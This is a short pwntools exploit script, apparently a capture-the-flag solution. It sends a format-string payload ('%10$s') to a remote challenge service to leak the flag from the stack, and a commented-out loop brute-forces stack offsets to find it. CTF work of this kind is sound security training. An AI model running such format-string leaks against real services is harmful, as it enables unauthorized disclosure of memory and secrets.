import pwn

elf = pwn.ELF('./chall')

p = pwn.remote("tjc.tf", 31258)

payload = b"".join(
        [
                b"%" + str(10).encode("utf-8") + b"$s",
        ])

p.sendlineafter(b"> ", payload)
p.interactive()

## Leak the flag from the stack
# for i in range(1,256):
#       print(f"{i} offset")
#       payload = b"".join(
#               [
#                       b"%" + str(i).encode('utf-8') + b"$s",
#               ])
#       p = elf.process()
#       p.sendlineafter(b"> ", payload)
#       response = p.recvall().decode('latin-1')
#       print(response)
#       if "flag{win}" in response:
#               break